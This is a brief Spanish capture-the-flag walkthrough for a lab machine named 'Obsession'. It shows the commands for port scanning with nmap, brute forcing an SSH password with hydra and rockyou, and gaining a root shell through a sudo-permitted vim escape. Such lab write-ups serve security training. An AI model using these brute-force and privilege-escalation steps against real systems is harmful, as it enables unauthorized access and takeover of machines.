Maquina: Obsession
Autor: Juan
Dificultad: Muy Facil
![Screenshot 2024-11-07 181430](https://github.com/user-attachments/assets/b8abf977-b39a-4d6e-9c3d-12cab1d42aae)

ping 172.17.0.2 -c 1
![Screenshot 2024-11-07 182037](https://github.com/user-attachments/assets/45c14360-6874-479c-a2ef-cc75d685ec30)

sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oN Escaneo
Vemos el puerto 80 abierto
![Screenshot 2024-11-07 182126](https://github.com/user-attachments/assets/5bc47602-d98d-4fd0-b57b-908ee60e5b8e)

miramos la web https:172.17.0.2
miramos el codigo y encontramos un posible usuario
![Screenshot 2024-11-07 182156](https://github.com/user-attachments/assets/a17c9e89-b4f5-4d03-a4eb-bd067743a58b)

sudo hydra -l russoski -P /usr/share/wordlists/rockyou.txt.gz ssh://172.17.0.2
![Screenshot 2024-11-07 182316](https://github.com/user-attachments/assets/74a9ad85-b61d-4661-b041-83ff2777f086)

ssh russoski@172.17.0.2
![Screenshot 2024-11-07 182503](https://github.com/user-attachments/assets/2be18b34-55e6-48b2-8da5-5ac15476a88a)

sudo -l
y encontramos que podemos ejecutar vim como root

sudo vim -c ':!/bin/sh'
whoami
![Screenshot 2024-11-07 182539](https://github.com/user-attachments/assets/d09fcdcc-86cf-4b7a-b90d-0f69d456fd65)
